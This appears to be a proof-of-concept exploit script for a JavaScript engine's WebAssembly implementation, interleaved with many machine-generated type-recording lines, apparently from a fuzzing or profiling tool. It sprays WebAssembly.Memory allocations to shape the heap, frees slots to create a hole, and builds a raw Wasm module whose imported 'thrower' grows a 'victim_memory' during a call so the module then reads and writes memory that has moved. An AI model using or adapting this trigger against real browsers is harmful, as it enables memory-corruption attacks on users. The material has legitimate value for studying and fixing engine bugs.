var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
var Inst34 = 0;
var Inst35 = 0;
var Inst36 = 0;
var Inst37 = 0;
var Inst38 = 0;
var Inst39 = 0;
var Inst40 = 0;
var Inst41 = 0;
var Inst42 = 0;
var Inst43 = 0;
var Inst44 = 0;
var Inst45 = 0;
var Inst46 = 0;
var Inst47 = 0;
var Inst48 = 0;
var Inst49 = 0;
var Inst50 = 0;
var Inst51 = 0;
var Inst52 = 0;
var Inst53 = 0;
var Inst54 = 0;
var Inst55 = 0;
var Inst56 = 0;
var Inst57 = 0;
var Inst58 = 0;
var Inst59 = 0;
var Inst60 = 0;
var Inst61 = 0;
var Inst62 = 0;
var Inst63 = 0;
var Inst64 = 0;
var Inst65 = 0;
var Inst66 = 0;
var Inst67 = 0;
var Inst68 = 0;
var Inst69 = 0;
var Inst70 = 0;
var Inst71 = 0;
var Inst72 = 0;
var Inst73 = 0;
var Inst74 = 0;
var Inst75 = 0;
var Inst76 = 0;
var Inst77 = 0;
var Inst78 = 0;
var Inst79 = 0;
var Inst80 = 0;
var Inst81 = 0;
var Inst82 = 0;
var Inst83 = 0;
var Inst84 = 0;
var Inst85 = 0;
var Inst86 = 0;
var Inst87 = 0;
var Inst88 = 0;
var Inst89 = 0;
var Inst90 = 0;
var Inst91 = 0;
var Inst92 = 0;
var Inst93 = 0;
var Inst94 = 0;
var Inst95 = 0;
var Inst96 = 0;
var Inst97 = 0;
var Inst98 = 0;
var Inst99 = 0;
var Inst100 = 0;
var Inst101 = 0;
var Inst102 = 0;
var Inst103 = 0;
var Inst104 = 0;
var Inst105 = 0;
var Inst106 = 0;
var Inst107 = 0;
var Inst108 = 0;
var Inst109 = 0;
var Inst110 = 0;
var Inst111 = 0;
var Inst112 = 0;
var Inst113 = 0;
var Inst114 = 0;
var Inst115 = 0;
var Inst116 = 0;
var Inst117 = 0;
var Inst118 = 0;
var Inst119 = 0;
var Inst120 = 0;
var Inst121 = 0;
var Inst122 = 0;
var Inst123 = 0;
var Inst124 = 0;
var Inst125 = 0;
var Inst126 = 0;
var Inst127 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
try { if (Inst1 <= 1000 && typeof (WebAssembly.Memory) != "undefined") {_RecordType("<27,45,1>",(WebAssembly.Memory)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (WebAssembly) != "undefined") {_RecordType("<27,38,1>",(WebAssembly)); Inst2++; } } catch(e) {}
const global_memory0 = new WebAssembly.Memory({initial: 1, maximum: 1})
try { if (Inst0 <= 1000 && typeof (global_memory0) != "undefined") {_RecordType("<6,20,1>",(global_memory0)); Inst0++; } } catch(e) {}
const memory1_test = new WebAssembly.Memory({initial: 1, maximum: 65536});
try { if (Inst4 <= 1000 && typeof (WebAssembly.Memory) != "undefined") {_RecordType("<99,117,3>",(WebAssembly.Memory)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (WebAssembly) != "undefined") {_RecordType("<99,110,3>",(WebAssembly)); Inst5++; } } catch(e) {}
var victim_memory = null;
try { if (Inst3 <= 1000 && typeof (memory1_test) != "undefined") {_RecordType("<80,92,3>",(memory1_test)); Inst3++; } } catch(e) {}

function mkinst(thrower, memory1) {
try { if (Inst6 <= 1000 && typeof (victim_memory) != "undefined") {_RecordType("<155,168,5>",(victim_memory)); Inst6++; } } catch(e) {}
  inst = new WebAssembly.Instance(mod, {mod: {thrower: thrower, mem0: global_memory0, mem1: memory1,}});
}

try { if (Inst7 <= 1000 && typeof (mkinst) != "undefined") {_RecordType("<191,197,9>",(mkinst)); Inst7++; } } catch(e) {}
// const builder = new WasmModuleBuilder();
try { if (Inst8 <= 1000 && typeof (thrower) != "undefined") {_RecordType("<198,205,9>",(thrower)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (memory1) != "undefined") {_RecordType("<207,214,9>",(memory1)); Inst9++; } } catch(e) {}
// builder.addType(makeSig([], []));
try { if (Inst11 <= 1000 && typeof (WebAssembly.Instance) != "undefined") {_RecordType("<233,253,11>",(WebAssembly.Instance)); Inst11++; } } catch(e) {}try { if (Inst12 <= 1000 && typeof (WebAssembly) != "undefined") {_RecordType("<233,244,11>",(WebAssembly)); Inst12++; } } catch(e) {}try { if (Inst13 <= 1000 && typeof (mod) != "undefined") {_RecordType("<254,257,11>",(mod)); Inst13++; } } catch(e) {}try { if (Inst14 <= 1000 && typeof (thrower) != "undefined") {_RecordType("<275,282,11>",(thrower)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (global_memory0) != "undefined") {_RecordType("<290,304,11>",(global_memory0)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (memory1) != "undefined") {_RecordType("<312,319,11>",(memory1)); Inst16++; } } catch(e) {}
// builder.addType(makeSig([], [kWasmI32]));
try { if (Inst10 <= 1000 && typeof (inst) != "undefined") {_RecordType("<222,226,11>",(inst)); Inst10++; } } catch(e) {}
// builder.addImport('mod', 'thrower', 0 /* sig */);
// builder.addImportedMemory('mod', 'mem0', 1, 1, false, false);
// builder.addImportedMemory('mod', 'mem1', 1, 65536, false, false);
// builder.addFunction(undefined, 1 /* sig */)
//   .addBodyWithEnd([
//     kExprI32Const, 0x0,
//     kExprI32Const, 0x2b,
//     kExprI32StoreMem, 0x40, 0x01, 0x00,
//     kExprTry, 0x40,
//       kExprCallFunction, 0x00,
//     kExprCatchAll, 
//       kExprI32Const, 0x0,
//       kExprI32Const, 0x2a, 
//       kExprI32StoreMem, 0x40, 0x01, 0x00,
//       kExprEnd,
//     kExprI32Const, 0x0,
//     kExprI32LoadMem, 0x40, 0x01, 0x00,
//     kExprEnd,
// ]);
// builder.addExport('bad', 1);
// builder.toBuffer();

wire = new Uint8Array([0,97,115,109,1,0,0,0,1,8,2,96,0,0,96,0,1,127,2,43,3,3,109,111,100,7,116,104,114,111,119,101,114,0,0,3,109,111,100,4,109,101,109,48,2,1,1,1,3,109,111,100,4,109,101,109,49,2,1,1,128,128,4,3,2,1,1,7,7,1,3,98,97,100,0,1,10,32,1,30,0,65,0,65,43,54,64,1,0,6,64,16,0,25,65,0,65,42,54,64,1,0,11,65,0,40,64,1,0,11])

function mkmod() {
  mod = new WebAssembly.Module(wire);
  mkinst(function() {}, memory1_test);
  for (let i = 0; i < 300000; i++) {
    inst.exports.bad();
  }
}

var small_spray = []
var mid_spray = []
var large_spray = []

function run() {
  mkmod();

  var hole = new WebAssembly.Memory({initial: 1, maximum: 512 * 1024 / 64}) // 512 M

  var smallsz = 512 * 1024 / 64 / 32; //16M
  var midsz = 512 * 1024 / 64 / 16; // 32M
  var largesz = 512 * 1024 / 64 / 8; // 64M

  var small_amount = 0;
  while(1) {
    try{
      var small = new WebAssembly.Memory({initial: smallsz - 1, maximum: smallsz})
      small_spray.push(small)
      small_amount = small_amount + 1
    } catch(e) {
      console.log(e) //RangeError: WebAssembly.Memory(): could not allocate memory
      break;
    }
try { if (Inst18 <= 1000 && typeof (Uint8Array) != "undefined") {_RecordType("<1229,1239,67>",(Uint8Array)); Inst18++; } } catch(e) {}
  }
try { if (Inst17 <= 1000 && typeof (wire) != "undefined") {_RecordType("<1218,1222,67>",(wire)); Inst17++; } } catch(e) {}
  console.log("spary small_amount: " + small_amount)

  hole = null;
try { if (Inst19 <= 1000 && typeof (mkmod) != "undefined") {_RecordType("<1562,1567,71>",(mkmod)); Inst19++; } } catch(e) {}
  for(let i=0; i<8; i++) {
    var small = new WebAssembly.Memory({initial: smallsz - 1, maximum: smallsz})
try { if (Inst21 <= 1000 && typeof (WebAssembly.Module) != "undefined") {_RecordType("<1586,1604,73>",(WebAssembly.Module)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (WebAssembly) != "undefined") {_RecordType("<1586,1597,73>",(WebAssembly)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (wire) != "undefined") {_RecordType("<1605,1609,73>",(wire)); Inst23++; } } catch(e) {}
    small_spray.push(small)    
try { if (Inst20 <= 1000 && typeof (mod) != "undefined") {_RecordType("<1576,1579,73>",(mod)); Inst20++; } } catch(e) {}
  }  
try { if (Inst24 <= 1000 && typeof (mkinst) != "undefined") {_RecordType("<1616,1622,75>",(mkinst)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (memory1_test) != "undefined") {_RecordType("<1638,1650,75>",(memory1_test)); Inst25++; } } catch(e) {}
  for(let i=0; i<4; i++) {
    var mid = new WebAssembly.Memory({initial: 1, maximum: midsz})
    mid_spray.push(mid)
try { if (Inst26 <= 1000 && typeof (i) != "undefined") {_RecordType("<1666,1667,77>",(i)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (i) != "undefined") {_RecordType("<1673,1674,77>",(i)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (i) != "undefined") {_RecordType("<1685,1686,77>",(i)); Inst28++; } } catch(e) {}
  }
try { if (Inst29 <= 1000 && typeof (inst.exports.bad) != "undefined") {_RecordType("<1698,1714,79>",(inst.exports.bad)); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (inst.exports) != "undefined") {_RecordType("<1698,1710,79>",(inst.exports)); Inst30++; } } catch(e) {}try { if (Inst31 <= 1000 && typeof (inst) != "undefined") {_RecordType("<1698,1702,79>",(inst)); Inst31++; } } catch(e) {}
  for(let i=0; i<4; i++) {
    var large = new WebAssembly.Memory({initial: 1, maximum: largesz})
    large_spray.push(large)    
  }

  while(1) {
    try{
      var small = new WebAssembly.Memory({initial: smallsz - 1, maximum: smallsz})
      small_spray.push(small)
try { if (Inst32 <= 1000 && typeof (small_spray) != "undefined") {_RecordType("<1737,1748,87>",(small_spray)); Inst32++; } } catch(e) {}
    } catch(e) {
      console.log(e) //RangeError: WebAssembly.Memory(): could not allocate memory
try { if (Inst33 <= 1000 && typeof (mid_spray) != "undefined") {_RecordType("<1760,1769,89>",(mid_spray)); Inst33++; } } catch(e) {}
      break;
    }
try { if (Inst34 <= 1000 && typeof (large_spray) != "undefined") {_RecordType("<1781,1792,91>",(large_spray)); Inst34++; } } catch(e) {}
  }

  var maxsize = Math.floor(midsz * 4 / 3)
try { if (Inst35 <= 1000 && typeof (run) != "undefined") {_RecordType("<1812,1815,95>",(run)); Inst35++; } } catch(e) {}

  function thrower() {
try { if (Inst36 <= 1000 && typeof (mkmod) != "undefined") {_RecordType("<1824,1829,97>",(mkmod)); Inst36++; } } catch(e) {}
    victim_memory.grow(maxsize - 1); 
    throw 'bleh';
  }

try { if (Inst38 <= 1000 && typeof (WebAssembly.Memory) != "undefined") {_RecordType("<1855,1873,101>",(WebAssembly.Memory)); Inst38++; } } catch(e) {}try { if (Inst39 <= 1000 && typeof (WebAssembly) != "undefined") {_RecordType("<1855,1866,101>",(WebAssembly)); Inst39++; } } catch(e) {}
  mid_spray[0] = null;
try { if (Inst37 <= 1000 && typeof (hole) != "undefined") {_RecordType("<1844,1848,101>",(hole)); Inst37++; } } catch(e) {}

  victim_memory = new WebAssembly.Memory({initial: 1, maximum: maxsize})
  mkinst(thrower, victim_memory);

try { if (Inst40 <= 1000 && typeof (smallsz) != "undefined") {_RecordType("<1934,1941,105>",(smallsz)); Inst40++; } } catch(e) {}
  large_spray[0] = null;

try { if (Inst41 <= 1000 && typeof (midsz) != "undefined") {_RecordType("<1980,1985,107>",(midsz)); Inst41++; } } catch(e) {}
  inst.exports.bad()

try { if (Inst42 <= 1000 && typeof (largesz) != "undefined") {_RecordType("<2025,2032,109>",(largesz)); Inst42++; } } catch(e) {}
  return;
}
  
run();
try { if (Inst43 <= 1000 && typeof (small_amount) != "undefined") {_RecordType("<2074,2086,113>",(small_amount)); Inst43++; } } catch(e) {}
